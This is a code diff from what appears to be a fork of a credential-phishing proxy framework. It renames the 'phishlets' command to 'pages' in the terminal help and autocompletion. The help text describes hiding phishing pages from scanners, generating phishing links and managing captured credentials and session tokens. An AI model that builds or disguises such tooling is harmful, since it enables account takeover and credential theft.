@@ -59,7 +59,7 @@ func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Databas
 			readline.PcItem("server"),
 			readline.PcItem("ip"),
 			readline.PcItem("status"),
-			readline.PcItem("phishlet", readline.PcItem("show"), readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("hostname"), readline.PcItem("url")),
+			readline.PcItem("pages", readline.PcItem("show"), readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("hostname"), readline.PcItem("url")),
 			readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))),
 			readline.PcItem("exit"),
 		)
@@ -987,14 +987,14 @@ func (t *Terminal) createHelp() {
 		readline.PcItem("pages", readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter))))
-	h.AddSubCommand("phishlets", nil, "", "show status of all available pages")
-	h.AddSubCommand("phishlets", []string{"hostname"}, "hostname <phishlet> <hostname>", "set hostname for given page (e.g. this.is.not.a.phishing.site.evilsite.com)")
-	h.AddSubCommand("phishlets", []string{"enable"}, "enable <phishlet>", "enables page and requests ssl/tls certificate if needed")
-	h.AddSubCommand("phishlets", []string{"disable"}, "disable <phishlet>", "disables page")
-	h.AddSubCommand("phishlets", []string{"hide"}, "hide <phishlet>", "hides the phishing page, logging and redirecting all requests to it (good for avoiding scanners when sending out phishing links)")
-	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
-	h.AddSubCommand("phishlets", []string{"get-url"}, "get-url <phishlet> <redirect_url>", "generates phishing url with redirection on successful authentication")
-	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")
+	h.AddSubCommand("pages", nil, "", "show status of all available pages")
+	h.AddSubCommand("pages", []string{"hostname"}, "hostname <phishlet> <hostname>", "set hostname for given page (e.g. this.is.not.a.phishing.site.evilsite.com)")
+	h.AddSubCommand("pages", []string{"enable"}, "enable <phishlet>", "enables page and requests ssl/tls certificate if needed")
+	h.AddSubCommand("pages", []string{"disable"}, "disable <phishlet>", "disables page")
+	h.AddSubCommand("pages", []string{"hide"}, "hide <phishlet>", "hides the phishing page, logging and redirecting all requests to it (good for avoiding scanners when sending out phishing links)")
+	h.AddSubCommand("pages", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
+	h.AddSubCommand("pages", []string{"get-url"}, "get-url <phishlet> <redirect_url>", "generates phishing url with redirection on successful authentication")
+	h.AddSubCommand("pages", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")
 
 	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
 		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
